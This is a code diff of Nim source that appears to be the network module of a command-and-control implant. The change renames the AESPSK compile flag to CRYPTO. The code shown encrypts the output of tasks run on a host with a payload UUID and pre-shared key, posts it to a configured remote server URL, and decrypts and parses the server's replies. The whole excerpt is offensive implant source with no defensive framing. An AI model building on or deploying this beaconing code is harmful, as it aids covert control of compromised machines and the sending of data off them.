@@ -7,13 +7,13 @@ from task import Job
 import json
 import uri
 import tables
-when defined(AESPSK):
+when defined(CRYPTO):
     from crypto import encryptStr,decryptStr
     from uri import decodeUrl
 
 # TODO sort config
 proc Fetch*(curConfig: Config, bdata: string, isGet: bool): Future[string] {.async.} = 
-    let dataToSend = when defined(AESPSK): encryptStr(curConfig.PayloadUUID, curConfig.Psk, bdata) else: bdata
+    let dataToSend = when defined(CRYPTO): encryptStr(curConfig.PayloadUUID, curConfig.Psk, bdata) else: bdata
     var proxySet = false
     var myProxy : Proxy
     when not defined(release):
@@ -50,7 +50,7 @@ proc Fetch*(curConfig: Config, bdata: string, isGet: bool): Future[string] {.asy
             result = await postContent(client, $(parseUri(curConfig.Servers[0].Domain) / curConfig.PostUrl), dataToSend)
         when not defined(release):
             echo "Just received data back from get or post request: ", result
-        when defined(AESPSK):
+        when defined(CRYPTO):
             # echo "inside post request just received back: encrypted: ", result
             result = decryptStr(curConfig.PayloadUUID, curConfig.Psk, result)
             # echo "after post request decrypted data: ", result
@@ -144,7 +144,7 @@ proc postUp*(curConfig: Config, results: seq[Job]): Future[tuple[postupResp: str
                 respJson["responses"].add(jNode)
             when not defined(release):
                 echo "respJson: ", $(respJson)
-            let data = when defined(AESPSK): $(respJson) else: encode(curConfig.PayloadUUID & $(respJson), true)
+            let data = when defined(CRYPTO): $(respJson) else: encode(curConfig.PayloadUUID & $(respJson), true)
             let fetchData = await Fetch(curConfig, data, false)
             if isDownloadFirst:
                 when not defined(release):
@@ -152,7 +152,7 @@ proc postUp*(curConfig: Config, results: seq[Job]): Future[tuple[postupResp: str
                     # Indicates json response needs to be parsed for file_id
                     echo "your fetchdata: ", $(fetchData)
                     # echo "fetchdata decoded: ", decode(fetchData)
-                let parsedJson = when defined(AESPSK): parseJson(fetchData[36 .. ^1]) else: parseJson(decode(fetchData)[36 .. ^1]) 
+                let parsedJson = when defined(CRYPTO): parseJson(fetchData[36 .. ^1]) else: parseJson(decode(fetchData)[36 .. ^1]) 
                 when not defined(release):
                     echo "parsedJson: ", $(parsedJson)
                 for resp in parsedJson["responses"].getElems():
